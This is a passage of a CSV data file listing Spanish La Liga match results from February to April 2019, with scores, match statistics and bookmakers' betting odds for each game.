,4.05,2.11,3.16,4.24,2.1,3.1,4,2.1,3.25,4.1,32,2.13,2.09,3.3,3.12,4.3,4.07,30,2.78,2.64,1.57,1.47,16,-0.25,1.81,1.78,2.16,2.11,2.07,3.09,4.55\r\nSP1,16/02/2019,Barcelona,Valladolid,1,0,H,1,0,H,20,10,8,0,12,18,3,5,1,3,0,0,1.14,9,15,1.16,8,16,1.15,8,17,1.15,8.44,21.24,1.14,8,19,1.15,9,19,31,1.18,1.16,9,8.08,21.24,17.25,29,1.41,1.36,3.5,3.07,17,-2,1.79,1.75,2.19,2.13,1.14,9.04,23.66\r\nSP1,16/02/2019,Celta,Levante,1,4,A,0,2,A,14,14,7,8,12,17,5,7,1,1,1,0,1.8,3.8,4.5,1.85,3.7,4.2,1.8,3.9,4.2,1.83,4.05,4.26,1.78,3.9,4.33,1.83,4,4.3,32,1.87,1.82,4.05,3.85,4.5,4.2,31,1.7,1.65,2.33,2.22,17,-1,2.55,2.44,1.65,1.57,1.75,4.06,4.75\r\nSP1,16/02/2019,Sociedad,Leganes,3,0,H,0,0,D,15,8,6,3,10,16,4,1,4,2,0,0,2.05,3.1,4.2,2.05,3.1,4.1,2.05,3.15,4,2.11,3.2,4.18,2.05,3.1,4.2,2.1,3.2,4.1,31,2.11,2.07,3.21,3.13,4.27,4.06,29,2.61,2.48,1.57,1.53,15,-0.25,1.79,1.77,2.19,2.11,2.33,2.97,3.84\r\nSP1,16/02/2019,Vallecano,Ath Madrid,0,1,A,0,0,D,12,4,6,3,10,14,4,6,0,1,0,0,6,3.5,1.65,5.75,3.6,1.67,4.9,3.4,1.8,5.68,3.86,1.68,5.5,3.7,1.67,6,3.75,1.67,32,6,5.51,3.86,3.7,1.8,1.68,31,2.3,2.17,1.74,1.68,18,1,1.73,1.67,2.45,2.26,6.59,4.03,1.58\r\nSP1,17/02/2019,Betis,Alaves,1,1,D,1,1,D,19,6,10,3,10,12,6,3,4,1,0,0,1.72,3.5,5.25,1.8,3.4,5,1.8,3.5,4.7,1.83,3.42,5.31,1.78,3.4,5.25,1.8,3.5,4.8,32,1.85,1.8,3.57,3.42,5.33,5,31,2.35,2.26,1.69,1.63,18,-1,2.63,2.54,1.59,1.54,1.76,3.55,5.63\r\nSP1,17/02/2019,Real Madrid,Girona,1,2,A,1,0,H,19,14,7,6,13,18,7,0,3,2,1,0,1.16,8,15,1.19,7,15,1.2,7,13,1.21,7.15,14.44,1.18,7.5,15,1.2,7.5,15,32,1.23,1.2,8,7.03,16.5,14.12,31,1.44,1.41,3.2,2.84,18,-2,2.03,1.96,1.95,1.88,1.18,8.03,15.95\r\nSP1,17/02/2019,Valencia,Espanol,0,0,D,0,0,D,21,6,1,1,12,10,10,2,2,4,0,1,1.72,3.7,4.8,1.8,3.5,4.75,1.75,3.7,4.8,1.78,3.69,5.17,1.75,3.7,4.8,1.75,3.8,5,32,1.84,1.77,3.8,3.63,5.17,4.81,30,2,1.93,1.95,1.87,18,-1,2.55,2.41,1.65,1.6,1.81,3.6,5.1\r\nSP1,17/02/2019,Villarreal,Sevilla,3,0,H,2,0,H,12,21,6,5,7,12,6,4,4,1,0,0,2.5,3.4,2.8,2.45,3.5,2.8,2.6,3.3,2.75,2.64,3.6,2.72,2.5,3.5,2.75,2.5,3.6,2.7,32,2.65,2.54,3.6,3.45,2.83,2.75,30,1.88,1.82,2.05,1.98,16,-0.25,2.27,2.2,1.76,1.71,2.47,3.47,3.02\r\nSP1,18/02/2019,Huesca,Ath Bilbao,0,1,A,0,1,A,12,9,2,4,16,11,3,5,5,1,0,0,3.1,3.1,2.5,3.1,3.1,2.45,2.85,3.2,2.55,3.25,3.16,2.5,3.1,3.1,2.45,3.1,3.2,2.4,32,3.3,3.11,3.22,3.12,2.55,2.45,31,2.4,2.31,1.66,1.61,16,0.25,1.83,1.79,2.13,2.09,3.68,3.21,2.26\r\nSP1,22/02/2019,Espanol,Huesca,1,1,D,1,0,H,13,13,2,4,9,16,7,4,2,4,0,0,1.72,3.6,5,1.75,3.6,5,1.77,3.65,4.75,1.79,3.68,5.1,1.73,3.7,5,1.75,3.7,5.2,35,1.81,1.76,3.8,3.64,5.27,4.96,34,2.08,2.01,1.86,1.81,21,-1,2.47,2.41,1.64,1.6,1.74,3.6,5.7\r\nSP1,23/02/2019,Alaves,Celta,0,0,D,0,0,D,17,8,4,2,15,9,3,4,2,2,0,0,2.3,3.3,3.2,2.3,3.25,3.2,2.3,3.25,3.2,2.35,3.4,3.28,2.3,3.3,3.2,2.38,3.3,3.3,35,2.4,2.31,3.42,3.29,3.35,3.22,34,2.25,2.19,1.75,1.68,19,-0.25,2.02,1.98,1.92,1.89,2.53,3.09,3.27\r\nSP1,23/02/2019,Ath Bilbao,Eibar,1,0,H,1,0,H,9,7,4,2,10,17,10,2,3,4,0,0,2.1,3.25,3.8,2.1,3.2,3.8,2.1,3.2,3.8,2.17,3.19,3.97,2.05,3.3,3.8,2.15,3.25,3.9,35,2.18,2.12,3.3,3.19,3.97,3.82,34,2.45,2.34,1.65,1.6,19,-0.25,1.84,1.81,2.12,2.07,2.21,3.18,3.86\r\nSP1,23/02/2019,Getafe,Vallecano,2,1,H,1,0,H,11,7,2,2,12,13,2,2,2,1,0,0,1.7,3.6,5.5,1.72,3.6,5.25,1.75,3.5,5.2,1.78,3.57,5.43,1.7,3.6,5.5,1.75,3.6,5.5,35,1.78,1.74,3.7,3.53,5.65,5.28,34,2.43,2.34,1.65,1.6,21,-1,2.52,2.42,1.62,1.59,1.93,3.33,4.82\r\nSP1,23/02/2019,Sevilla,Barcelona,2,4,A,2,1,H,13,17,4,8,15,11,3,8,6,1,0,0,3.5,4,1.95,3.6,4,1.91,3.6,3.9,1.93,3.69,4.05,1.96,3.6,3.8,1.95,3.75,4,1.95,35,3.75,3.62,4.1,3.91,2,1.94,33,1.55,1.49,2.76,2.57,19,0.75,1.75,1.71,2.26,2.2,3.99,4.24,1.85\r\nSP1,24/02/2019,Ath Madrid,Villarreal,2,0,H,1,0,H,15,14,7,3,9,10,6,7,0,3,0,0,1.57,3.75,7,1.57,3.9,6.25,1.57,3.9,6.4,1.58,4.08,6.56,1.55,4,6.5,1.55,4,6.5,35,1.63,1.57,4.1,3.92,7,6.34,34,2.25,2.15,1.75,1.7,21,-1,2.15,2.02,1.88,1.83,1.57,3.83,7.51\r\nSP1,24/02/2019,Leganes,Valencia,1,1,D,0,1,A,17,6,6,1,14,10,4,2,5,3,0,0,2.8,3.1,2.7,2.8,2.95,2.8,2.8,3.05,2.7,2.93,3.08,2.79,2.8,3,2.75,2.88,3.1,2.8,35,2.96,2.84,3.12,3.03,2.85,2.73,33,2.58,2.48,1.6,1.54,19,0.25,1.68,1.65,2.38,2.3,3.24,2.99,2.62\r\nSP1,24/02/2019,Levante,Real Madrid,1,2,A,0,1,A,11,19,2,5,17,11,4,6,5,3,1,1,5.25,4.75,1.53,5.25,4.6,1.55,5.2,4.65,1.55,5.85,4.68,1.55,5.5,4.6,1.53,5.75,4.75,1.5,35,5.9,5.54,4.8,4.56,1.61,1.54,32,1.4,1.36,3.3,3.07,21,1,2.11,2.04,1.89,1.82,6.48,5.29,1.45\r\nSP1,24/02/2019,Valladolid,Betis,0,2,A,0,1,A,10,6,2,3,10,9,13,4,1,2,0,0,2.7,3.2,2.75,2.75,3.2,2.7,2.65,3.15,2.8,2.72,3.32,2.81,2.62,3.2,2.8,2.63,3.2,2.8,35,2.75,2.67,3.32,3.17,2.86,2.78,34,2.4,2.3,1.66,1.62,19,-0.25,2.33,2.26,1.71,1.67,2.41,3.21,3.34\r\nSP1,25/02/2019,Girona,Sociedad,0,0,D,0,0,D,10,7,3,1,26,15,3,5,4,1,0,0,2.37,3.2,3,2.45,3.2,3,2.45,3.25,3,2.45,3.4,3.1,2.5,3.25,2.9,2.45,3.3,3,35,2.65,2.46,3.4,3.27,3.1,2.98,34,2.25,2.16,1.75,1.69,19,-0.25,2.16,2.1,1.83,1.79,2.37,3.25,3.38\r\nSP1,01/03/2019,Vallecano,Girona,0,2,A,0,1,A,9,12,3,4,17,23,7,1,3,4,1,0,2.25,3.4,3.2,2.25,3.3,3.3,2.3,3.35,3.2,2.36,3.37,3.3,2.2,3.3,3.4,2.3,3.4,3.25,31,2.36,2.29,3.52,3.33,3.53,3.25,30,2.01,1.94,1.94,1.87,17,-0.5,2.35,2.29,1.69,1.66,2.52,3.3,3.08\r\nSP1,02/03/2019,Espanol,Valladolid,3,1,H,1,1,D,15,14,6,3,17,8,5,3,2,2,0,0,1.8,3.6,4.75,1.78,3.5,5,1.8,3.5,4.85,1.82,3.59,5.01,1.8,3.5,4.75,1.8,3.6,5,32,1.85,1.8,3.7,3.52,5.01,4.83,31,2.4,2.25,1.7,1.65,19,-1,2.62,2.56,1.6,1.54,1.69,3.76,5.83\r\nSP1,02/03/2019,Huesca,Sevilla,2,1,H,1,0,H,7,12,3,5,15,16,3,12,5,4,0,0,3.8,3.6,1.95,3.9,3.6,1.95,3.85,3.55,1.95,3.94,3.74,1.98,3.9,3.6,1.95,4,3.6,2,33,4,3.85,3.75,3.6,2.02,1.96,31,1.9,1.85,2.05,1.96,19,0.25,2.27,2.21,1.75,1.71,4.11,3.61,1.98\r\nSP1,02/03/2019,Real Madrid,Barcelona,0,1,A,0,1,A,17,10,3,4,16,13,8,6,3,2,0,0,2.75,3.7,2.45,2.7,3.75,2.4,2.7,3.7,2.4,2.74,3.78,2.53,2.7,3.7,2.45,2.7,3.75,2.5,33,2.8,2.71,3.85,3.71,2.56,2.46,32,1.5,1.47,2.8,2.64,18,0.25,1.78,1.74,2.2,2.15,2.65,3.8,2.64\r\nSP1,02/03/2019,Villarreal,Alaves,1,2,A,0,0,D,9,10,2,2,15,12,8,2,2,3,0,0,1.66,3.75,5.5,1.67,3.7,5.5,1.67,3.85,5.2,1.67,4.02,5.47,1.65,3.9,5.25,1.67,3.9,5.75,33,1.7,1.67,4.05,3.86,5.75,5.31,31,2.07,2.01,1.86,1.81,21,-1,2.31,2.22,1.75,1.69,1.57,4.21,6.39\r\nSP1,03/03/2019,Betis,Getafe,1,2,A,0,2,A,6,11,2,5,14,14,4,4,2,2,0,0,2.3,3,3.4,2.35,3,3.4,2.35,3.05,3.35,2.42,3.08,3.48,2.25,3.1,3.6,2.4,3.1,3.25,33,2.42,2.37,3.15,3.02,3.7,3.38,31,2.61,2.5,1.6,1.52,19,-0.25,2.06,2.02,1.91,1.85,2.4,3.13,3.45\r\nSP1,03/03/2019,Eibar,Celta,1,0,H,0,0,D,15,3,4,1,14,16,7,0,1,1,0,0,1.72,3.8,4.75,1.78,3.8,4.5,1.75,3.8,4.65,1.78,3.99,4.66,1.78,3.9,4.4,1.75,3.8,5,33,1.83,1.76,4,3.82,5,4.6,31,1.95,1.89,1.98,1.91,21,-1,2.47,2.4,1.65,1.6,1.81,3.71,4.83\r\nSP1,03/03/2019,Sociedad,Ath Madrid,0,2,A,0,2,A,19,8,3,3,12,17,7,3,1,4,0,1,4,3.25,2.05,3.75,3.25,2.1,3.7,3.3,2.1,3.87,3.37,2.12,3.7,3.25,2.1,3.75,3.25,2.1,33,4,3.71,3.4,3.28,2.19,2.11,31,2.55,2.43,1.6,1.56,19,0.25,2.12,2.06,1.85,1.81,4.23,3.1,2.14\r\nSP1,03/03/2019,Valencia,Ath Bilbao,2,0,H,0,0,D,11,4,3,1,12,13,6,2,0,3,0,0,2,3.3,4,2,3.25,4.1,1.97,3.25,4.2,2.02,3.29,4.42,1.95,3.25,4.33,2,3.25,4.1,33,2.06,2,3.4,3.23,4.42,4.22,31,2.55,2.42,1.6,1.56,19,-0.25,1.74,1.7,2.3,2.22,2.01,3.26,4.5\r\nSP1,04/03/2019,Leganes,Levante,1,0,H,1,0,H,14,15,3,4,15,10,2,2,6,4,0,0,1.95,3.4,4.2,1.91,3.4,4.25,1.9,3.45,4.2,1.91,3.56,4.48,1.95,3.4,4.2,1.93,3.4,4.2,32,2.01,1.92,3.56,3.42,4.5,4.24,31,2.2,2.13,1.76,1.71,18,-1,2.99,2.83,1.5,1.44,2.08,3.23,4.23\r\nSP1,08/03/2019,Ath Bilbao,Espanol,1,1,D,0,1,A,15,5,6,2,13,20,7,0,3,5,0,0,1.66,3.6,6,1.67,3.6,5.75,1.65,3.65,5.8,1.67,3.77,6.11,1.7,3.6,5.5,1.65,3.75,6.25,31,1.73,1.67,3.8,3.64,6.28,5.86,30,2.35,2.26,1.7,1.64,16,-0.5,1.7,1.66,2.36,2.31,1.68,3.65,6.19\r\nSP1,09/03/2019,Alaves,Eibar,1,1,D,0,0,D,16,20,3,3,10,18,3,5,1,1,0,0,2.9,3.2,2.55,2.9,3,2.7,2.95,3.05,2.6,3.04,3.01,2.75,2.88,3.1,2.62,3,3.2,2.63,34,3.05,2.94,3.28,3.06,2.75,2.64,32,2.58,2.44,1.61,1.55,20,0.25,1.75,1.7,2.3,2.23,3.38,3.29,2.35\r\nSP1,09/03/2019,Ath Madrid,Leganes,1,0,H,0,0,D,13,3,4,2,9,7,4,4,2,2,0,0,1.45,4.2,10,1.45,4.2,8.25,1.47,4,8.1,1.47,4.2,9.04,1.47,4,8.5,1.45,4.2,9.5,34,1.5,1.46,4.35,4.1,10,8.62,32,2.45,2.36,1.65,1.59,21,-1,1.86,1.82,2.1,2.05,1.52,3.81,8.97\r\nSP1,09/03/2019,Barcelona,Vallecano,3,1,H,1,1,D,12,8,6,1,12,17,10,4,1,2,0,0,1.16,8,15,1.17,8,15,1.15,8,16.5,1.15,8.86,18.11,1.14,8,21,1.15,8.5,23,34,1.18,1.15,8.95,8.24,23,17.91,31,1.4,1.36,3.3,3.08,21,-2,1.75,1.7,2.3,2.22,1.11,11.53,23.51\r\nSP1,09/03/2019,Getafe,Huesca,2,1,H,0,1,A,14,8,6,1,14,17,13,1,0,4,0,0,1.61,3.6,6.5,1.62,3.7,6.25,1.63,3.7,5.8,1.63,3.91,6.31,1.62,3.75,6,1.65,3.8,6.25,34,1.67,1.63,3.91,3.77,6.5,6.03,33,2.3,2.23,1.71,1.66,21,-1,2.23,2.17,1.76,1.73,1.58,3.9,7.05\r\nSP1,10/03/2019,Celta,Betis,0,1,A,0,0,D,7,14,1,4,17,16,4,4,3,0,0,0,2.5,3.3,2.9,2.45,3.3,2.95,2.45,3.25,2.95,2.55,3.35,2.99,2.45,3.3,3,2.55,3.3,3,34,2.55,2.48,3.42,3.27,3.06,2.97,33,2.13,2.06,1.85,1.76,20,-0.25,2.17,2.12,1.81,1.77,2.56,3.37,2.96\r\nSP1,10/03/2019,Girona,Valencia,2,3,A,1,1,D,18,11,8,6,13,10,6,1,1,4,0,1,3.3,3.2,2.35,3.1,3.2,2.4,3.15,3.25,2.35,3.22,3.27,2.45,3.2,3.2,2.38,3.2,3.25,2.45,34,3.32,3.15,3.35,3.23,2.48,2.39,33,2.2,2.13,1.77,1.71,20,0.25,1.9,1.84,2.08,2.04,3.8,3.43,2.12\r\nSP1,10/03/2019,Levante,Villarreal,0,2,A,0,0,D,11,13,3,5,8,21,8,2,3,5,0,0,2.9,3.3,2.5,2.8,3.4,2.5,2.75,3.45,2.5,2.84,3.54,2.56,2.8,3.4,2.5,2.75,3.5,2.5,34,2.9,2.79,3.57,3.45,2.57,2.51,33,1.8,1.75,2.19,2.09,20,0.25,1.76,1.73,2.23,2.17,2.78,3.59,2.59\r\nSP1,10/03/2019,Sevilla,Sociedad,5,2,H,1,1,D,22,9,11,2,12,13,7,2,2,2,0,0,1.66,4.2,4.75,1.65,4.25,4.75,1.67,4.05,4.95,1.67,4.29,5.04,1.65,4,5.25,1.62,4.1,5.2,34,1.71,1.66,4.3,4.1,5.25,4.98,33,1.8,1.73,2.2,2.1,21,-1,2.25,2.17,1.8,1.73,1.63,4.07,5.85\r\nSP1,10/03/2019,Valladolid,Real Madrid,1,4,A,1,1,D,10,15,2,6,14,12,5,12,1,6,0,1,5,4.33,1.61,5.25,4.25,1.6,4.85,4.15,1.65,5.22,4.3,1.65,5.25,4.2,1.62,5,4.33,1.62,34,5.5,5.12,4.43,4.21,1.7,1.63,32,1.61,1.56,2.5,2.4,21,1,1.86,1.82,2.1,2.05,5.77,4.29,1.6\r\nSP1,15/03/2019,Sociedad,Levante,1,1,D,1,0,H,22,8,7,3,10,12,5,3,2,2,0,0,1.8,3.75,4.5,1.85,3.5,4.4,1.85,3.55,4.3,1.89,3.61,4.53,1.83,3.6,4.4,1.87,3.75,4.4,31,1.9,1.86,3.75,3.58,4.6,4.36,28,1.97,1.89,2,1.92,16,-1,2.69,2.63,1.55,1.51,1.87,3.7,4.52\r\nSP1,16/03/2019,Ath Bilbao,Ath Madrid,2,0,H,0,0,D,9,9,5,2,12,4,1,7,3,1,0,0,3.9,3,2.2,3.7,3,2.25,3.7,2.95,2.25,3.87,3.01,2.3,3.75,3,2.2,3.8,3,2.3,34,3.9,3.69,3.1,2.98,2.31,2.26,33,2.9,2.78,1.5,1.44,20,0.25,2,1.95,1.95,1.92,3.88,2.92,2.36\r\nSP1,16/03/2019,Huesca,Alaves,1,3,A,1,1,D,7,12,2,5,21,23,2,2,1,3,0,0,2.45,3.2,3,2.5,3.25,2.9,2.5,3.15,3.05,2.52,3.22,3.15,2.45,3.1,3.1,2.5,3.2,3.13,31,2.55,2.47,3.3,3.18,3.15,3.03,33,2.4,2.31,1.66,1.62,19,-0.25,2.16,2.11,1.82,1.78,2.42,3.23,3.31\r\nSP1,16/03/2019,Leganes,Girona,0,2,A,0,2,A,12,8,3,4,20,6,6,2,8,1,0,0,2.15,3.2,3.7,2.05,3.1,4.1,2.1,3.15,3.8,2.18,3.1,4.07,2.15,3.1,3.9,2.15,3.2,4,34,2.2,2.13,3.25,3.13,4.1,3.86,32,2.62,2.49,1.58,1.53,19,-0.25,1.84,1.82,2.1,2.06,2.31,3.11,3.69\r\nSP1,16/03/2019,Real Madrid,Celta,2,0,H,0,0,D,22,6,7,1,15,8,9,2,1,0,0,0,1.18,7.5,13,1.18,7.25,15,1.25,6.1,11,1.2,7.48,14.42,1.2,7,15,1.2,7.5,15,31,1.25,1.2,7.85,7.17,15.75,13.69,32,1.4,1.35,3.35,3.15,21,-2,2.05,1.89,2.05,1.97,1.16,8.77,16.3\r\nSP1,17/03/2019,Betis,Barcelona,1,4,A,0,2,A,13,16,3,9,10,11,3,7,1,2,0,0,7,5,1.4,6.75,5.25,1.4,7.4,4.9,1.4,6.33,5.11,1.48,6.5,4.8,1.44,6.5,5,1.44,34,7.4,6.37,5.25,4.91,1.5,1.45,33,1.46,1.42,2.95,2.79,21,1,2.31,2.23,1.75,1.69,6.3,4.63,1.52\r\nSP1,17/03/2019,Eibar,Valladolid,1,2,A,0,0,D,15,8,3,3,16,14,5,0,4,2,0,0,1.66,3.8,5.5,1.62,3.8,5.75,1.65,3.8,5.5,1.65,3.9,6.08,1.63,3.75,5.8,1.65,3.8,6.25,34,1.7,1.64,4,3.82,6.25,5.73,33,2.18,2.11,1.8,1.73,21,-1,2.23,2.16,1.77,1.73,1.64,3.89,6.16\r\nSP1,17/03/2019,Espanol,Sevilla,0,1,A,0,0,D,13,12,3,3,11,14,6,5,3,4,1,1,2.4,3.5,2.9,2.55,3.6,2.65,2.5,3.45,2.75,2.56,3.59,2.81,2.45,3.5,2.8,2.6,3.5,2.8,34,2.6,2.51,3.65,3.5,2.9,2.76,32,1.82,1.76,2.17,2.07,19,0.25,1.66,1.62,2.45,2.39,2.44,3.65,2.93\r\nSP1,17/03/2019,Valencia,Getafe,0,0,D,0,0,D,8,9,2,1,13,22,3,5,3,4,0,0,2,3.3,4,1.95,3.2,4.5,1.97,3.25,4.3,2,3.25,4.59,1.95,3.2,4.4,1.95,3.3,4.3,34,2.01,1.96,3.45,3.23,4.6,4.37,32,2.55,2.43,1.6,1.56,20,-0.25,1.71,1.68,2.33,2.26,1.86,3.47,4.93\r\nSP1,17/03/2019,Villarreal,Vallecano,3,1,H,0,1,A,12,7,4,3,16,7,5,5,3,3,0,0,1.6,4.2,5.5,1.6,4.2,5.25,1.63,4.1,5.1,1.65,4.19,5.35,1.62,4.2,5.25,1.62,4.2,5.25,34,1.66,1.63,4.33,4.15,5.55,5.18,33,1.75,1.7,2.25,2.15,21,-1,2.15,2.08,1.85,1.8,1.67,4.07,5.41\r\nSP1,29/03/2019,Girona,Ath Bilbao,1,2,A,1,0,H,6,8,2,5,18,18,3,3,2,4,0,0,2.87,2.9,2.7,2.85,2.95,2.75,2.9,2.95,2.75,2.94,3,2.85,2.8,2.9,2.88,2.9,3,2.8,35,3.06,2.89,3.05,2.95,2.89,2.78,33,2.7,2.57,1.55,1.5,19,-0.25,2.5,2.41,1.64,1.61,2.98,3.07,2.75\r\nSP1,30/03/2019,Alaves,Ath Madrid,0,4,A,0,2,A,14,11,4,7,10,8,9,2,2,2,0,0,5.5,3.4,1.75,5.5,3.4,1.75,5.1,3.35,1.8,5.49,3.35,1.83,5,3.4,1.8,5.25,3.4,1.83,34,5.5,5.2,3.5,3.37,1.84,1.79,32,2.6,2.51,1.59,1.52,19,1,1.56,1.52,2.75,2.6,6.1,3.45,1.74\r\nSP1,30/03/2019,Barcelona,Espanol,2,0,H,0,0,D,13,4,3,2,15,14,5,2,0,4,0,0,1.14,9,15,1.19,7.25,14,1.2,7,13,1.18,7.88,15.97,1.17,8,15,1.18,8.5,15,35,1.21,1.18,9,7.73,17,14.41,34,1.35,1.29,3.75,3.46,22,-2,1.85,1.79,2.13,2.07,1.19,7.4,17.18\r\nSP1,30/03/2019,Celta,Villarreal,3,2,H,0,2,A,15,14,6,5,7,8,10,7,1,3,0,0,2.5,3.3,2.75,2.55,3.4,2.75,2.6,3.3,2.75,2.71,3.33,2.82,2.55,3.3,2.8,2.63,3.3,2.8,35,2.71,2.62,3.45,3.29,2.9,2.77,33,2.05,1.98,1.9,1.84,20,-0.25,2.31,2.24,1.72,1.68,2.46,3.39,3.09\r\nSP1,30/03/2019,Getafe,Leganes,0,2,A,0,0,D,9,7,2,3,15,25,3,4,5,2,0,0,1.95,3.2,4.5,1.95,3.1,4.6,1.85,3.25,4.9,1.97,3.18,4.86,1.88,3.2,4.8,1.95,3.2,4.8,35,2,1.94,3.27,3.16,4.93,4.65,33,2.95,2.76,1.5,1.44,20,-1,3.27,3.02,1.45,1.41,1.99,3.06,5.1\r\nSP1,31/03/2019,Levante,Eibar,2,2,D,2,1,H,7,17,2,3,9,12,6,7,2,1,0,0,2.8,3.5,2.45,2.75,3.6,2.45,2.7,3.55,2.5,2.73,3.65,2.6,2.7,3.6,2.5,2.75,3.6,2.55,35,2.85,2.74,3.7,3.56,2.6,2.51,34,1.71,1.67,2.3,2.21,20,0.25,1.76,1.72,2.24,2.18,2.63,3.62,2.72\r\nSP1,31/03/2019,Real Madrid,Huesca,3,2,H,1,1,D,16,16,8,3,9,18,4,6,1,3,0,0,1.11,10,19,1.13,9.25,18.5,1.12,9,20,1.14,9.65,20.2,1.12,9,19,1.12,10,18,35,1.16,1.13,10.25,9.33,24,18.8,33,1.3,1.25,4.1,3.74,21,-2.5,1.97,1.92,1.98,1.93,1.19,7.71,16.03\r\nSP1,31/03/2019,Sevilla,Valencia,0,1,A,0,1,A,17,4,5,2,18,9,5,3,3,1,0,0,2.05,3.5,3.6,2.05,3.6,3.5,2.1,3.5,3.45,2.09,3.6,3.69,2.05,3.5,3.6,2.15,3.5,3.6,34,2.15,2.1,3.65,3.52,3.69,3.49,32,1.86,1.81,2.1,2.01,19,-0.25,1.87,1.82,2.13,2.04,2.72,3.44,2.73\r\nSP1,31/03/2019,Valladolid,Sociedad,1,1,D,1,0,H,10,10,4,1,18,8,7,5,4,1,0,0,2.6,3,3,2.6,3.2,2.85,2.6,3.05,2.95,2.63,3.19,3.02,2.6,3.1,2.9,2.63,3.1,2.88,35,2.7,2.62,3.2,3.11,3.03,2.92,34,2.5,2.37,1.65,1.58,20,-0.25,2.26,2.21,1.75,1.7,2.73,3.19,2.9\r\nSP1,31/03/2019,Vallecano,Betis,1,1,D,1,0,H,20,7,5,2,22,9,6,3,5,3,1,0,2.75,3.5,2.45,2.85,3.4,2.45,2.75,3.45,2.5,2.79,3.6,2.58,2.75,2.5,2.4,2.8,3.5,2.55,35,2.86,2.77,3.6,3.49,2.58,2.5,33,1.91,1.8,2.11,2.02,20,0.25,1.76,1.73,2.22,2.16,3.16,3.64,2.3\r\nSP1,02/04/2019,Ath Madrid,Girona,2,0,H,0,0,D,17,12,7,4,10,9,4,3,1,0,0,0,1.36,4.5,10,1.36,4.6,10,1.37,4.5,10,1.38,4.69,10.7,1.38,4.5,10,1.4,4.75,9.5,36,1.42,1.38,4.75,4.54,11.5,9.78,34,2.1,2.02,1.87,1.8,22,-1,1.7,1.63,2.43,2.33,1.37,4.76,10.96\r\nSP1,02/04/2019,Espanol,Getafe,1,1,D,0,0,D,9,13,3,3,14,14,5,4,4,3,0,0,2.4,3.1,3.2,2.4,3.1,3.2,2.45,3.1,3.15,2.49,3.17,3.24,2.45,3.1,3.1,2.55,3.1,3.2,36,2.55,2.45,3.2,3.1,3.28,3.16,34,2.55,2.43,1.59,1.56,18,-0.5,2.52,2.45,1.61,1.58,2.31,3.2,3.59\r\nSP1,02/04/2019,Villarreal,Barcelona,4,4,D,1,2,A,16,15,9,9,10,10,5,3,4,7,1,0,5.25,4.2,1.61,5.25,4.2,1.62,5,4,1.65,5.14,4.23,1.67,5,4.2,1.63,5.25,4.2,1.67,36,5.55,5.04,4.45,4.15,1.7,1.65,34,1.61,1.57,2.5,2.4,22,1,2.04,1.79,2.15,2.08,4.6,3.76,1.84\r\nSP1,03/04/2019,Ath Bilbao,Levante,3,2,H,2,0,H,14,11,7,6,13,14,2,9,3,7,0,1,1.61,4,5.5,1.6,4,5.75,1.6,3.95,5.7,1.61,4.14,6,1.6,3.9,5.8,1.62,4,6,36,1.65,1.61,4.15,3.98,6.1,5.75,34,2,1.92,1.96,1.89,22,-1,2.16,2.08,1.85,1.79,1.51,4.58,6.6\r\nSP1,03/04/2019,Eibar,Vallecano,2,1,H,0,1,A,12,13,6,2,14,9,2,6,2,2,0,0,1.61,4,5.5,1.65,3.8,5.5,1.63,4,5.2,1.66,4.13,5.44,1.63,4,5.25,1.67,4,5.5,36,1.69,1.64,4.2,3.99,5.69,5.29,34,1.91,1.79,2.12,2.03,22,-1,2.24,2.11,1.8,1.76,1.88,3.71,4.43\r\nSP1,03/04/2019,Huesca,Celta,3,3,D,0,1,A,23,11,7,5,9,12,5,0,2,3,0,0,2.62,3.5,2.62,2.65,3.4,2.65,2.6,3.35,2.7,2.71,3.41,2.76,2.62,3.3,2.7,2.75,3.4,2.7,36,2.75,2.64,3.5,3.35,2.84,2.72,34,2.01,1.95,1.92,1.86,20,-0.25,2.32,2.26,1.7,1.67,2.66,3.4,2.82\r\nSP1,03/04/2019,Valencia,Real Madrid,2,1,H,1,0,H,11,15,4,5,9,13,6,6,2,2,0,0,3.3,3.6,2.15,3.3,3.7,2.1,3.25,3.7,2.1,3.34,3.73,2.18,3.3,3.6,2.15,3.4,3.7,2.15,36,4,3.3,4.05,3.65,2.22,2.13,34,1.67,1.62,2.4,2.29,20,0.25,2.51,2.03,1.9,1.85,2.83,3.69,2.5\r\nSP1,04/04/2019,Leganes,Valladolid,1,0,H,0,0,D,18,8,2,1,13,11,3,4,2,2,0,0,1.9,3.3,4.5,1.91,3.25,4.5,1.93,3.2,4.55,1.95,3.27,4.78,1.91,3.2,4.6,1.91,3.25,4.6,36,2,1.93,3.35,3.22,4.8,4.57,34,2.77,2.61,1.55,1.48,20,-0.75,2.3,2.25,1.72,1.68,2.12,3.08,4.36\r\nSP1,04/04/2019,Sevilla,Alaves,2,0,H,1,0,H,18,5,5,2,13,19,11,1,3,4,0,0,1.5,4.33,6.5,1.53,4.25,6.25,1.55,4.2,5.9,1.52,4.54,6.65,1.5,4.4,6.5,1.5,4.4,6.25,36,1.55,1.52,4.55,4.38,6.76,6.24,35,1.8,1.74,2.17,2.09,22,-1,1.91,1.87,2.05,1.99,1.39,5.22,8.14\r\nSP1,04/04/2019,Sociedad,Betis,2,1,H,1,0,H,15,11,7,6,12,13,3,6,2,3,0,0,2.25,3.3,3.3,2.2,3.4,3.3,2.2,3.3,3.4,2.22,3.49,3.46,2.15,3.4,3.4,2.2,3.4,3.3,36,2.27,2.21,3.5,3.37,3.5,3.36,35,2.2,2.1,1.8,1.74,20,-0.25,1.96,1.9,2.02,1.96,2.27,3.45,3.39\r\nSP1,06/04/2019,Barcelona,Ath Madrid,2,0,H,0,0,D,21,9,10,2,14,12,5,1,3,4,0,1,1.75,3.6,5,1.78,3.6,4.75,1.9,3.7,3.9,1.76,3.97,4.96,1.75,3.7,4.75,1.8,3.8,4.8,34,1.9,1.76,3.97,3.76,5.02,4.73,32,1.9,1.84,2.06,1.97,19,-0.75,2,1.97,1.94,1.9,1.75,3.8,5.41\r\nSP1,06/04/2019,Girona,Espanol,1,2,A,0,0,D,14,9,5,2,23,20,1,4,5,2,0,0,2.5,3.2,3,2.55,3.1,3,2.5,3.15,2.95,2.52,3.26,3.17,2.45,3.2,3,2.55,3.25,3,34,2.61,2.49,3.29,3.17,3.17,3.04,32,2.3,2.22,1.71,1.66,19,-0.25,2.2,2.12,1.82,1.77,2.56,3.21,3.1\r\nSP1,06/04/2019,Real 